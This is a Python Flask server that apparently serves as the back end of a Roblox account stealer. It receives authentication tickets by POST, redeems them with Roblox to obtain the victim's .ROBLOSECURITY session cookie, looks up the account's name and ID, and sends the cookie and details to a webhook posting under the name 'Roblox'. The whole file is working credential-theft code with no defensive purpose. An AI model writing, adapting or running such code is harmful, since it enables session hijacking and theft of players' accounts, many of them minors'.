import requests,_thread,sys

from flask import Flask, request

app:Flask = Flask(__name__)

WEBHOOK = ""

def parse_cookies(cookie_string):
    cookies = cookie_string.split(', ') # Splits the cookies
    parsed_cookies = {}

    for cookie in cookies:
        parts = cookie.split('; ') # Splits cookie again
        name_value = parts[0].split('=')
        name = name_value[0]
        value = '='.join(name_value[1:]) # Join back any additinal '=' found in the value
        parsed_cookies[name] = {'value': value}
        for part in parts[1:]: # Parse the other components of the cookie (domain, path, etc)
            if '=' in part:
                key, val = part.split('=')
                parsed_cookies[name][key] = val
            else:
                parsed_cookies[name][part] = True

    return parsed_cookies

def redeem_authticket(ticket):
    req = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", data={"authenticationTicket": ticket}, headers={"RBXAuthenticationNegotiation": "1"}) # Trys to redeem the auth ticket
    try:
        print('hi',req.text, file=sys.stdout)
        print('hi',req.headers['set-cookie'], file=sys.stdout)
        parsed_cookie = parse_cookies(req.headers['set-cookie'])[".ROBLOSECURITY"]["value"]
        return parsed_cookie
    except Exception as E:
        print(f'ER: {E}')
        return ""

def main(auth_ticket):
    cookie = redeem_authticket(auth_ticket)
    statistics = None
    if cookie:
        headers = {
            'Cookie': f".ROBLOSECURITY={cookie}"
        }
        stats_response = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        if stats_response.status_code == 200:
            statistics = stats_response.json()

    embed = {
        "content": None,
        "embeds": [
            {
                "description": f"||```{cookie if cookie else 'COOKIE NOT FOUND'}```||",
                "color": None,
                "fields": [
                    {
                        "name": "Username",
                        "value": statistics['name'] if statistics else "N/A",
                        "inline": True
                    },
                    {
                        "name": "Display Name",
                        "value": statistics['displayName'] if statistics else "N/A",
                        "inline": True
                    },
                    {
                        "name": "User ID",
                        "value": statistics['id'] if statistics else "N/A",
                        "inline": True
                    },
                    {
                        "name": "URL",
                        "value": f'https://www.roblox.com/users/{statistics["id"]}/profile' if statistics else "N/A",
                        "inline": True
                    }
                ]
            }
        ],
        "username": "Roblox",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
        "attachments": []
    }

    requests.post(WEBHOOK, headers={"Content-Type": "application/json"}, json=embed)

@app.route('/', methods=['POST'])
def home():
    data = request.get_data().decode().strip()
    print(data, file=sys.stdout)
    _thread.start_new_thread(main, (data,))
    return 'OK'

if __name__ == '__main__':
    app.run(port=8080, host='0.0.0.0', debug=True)
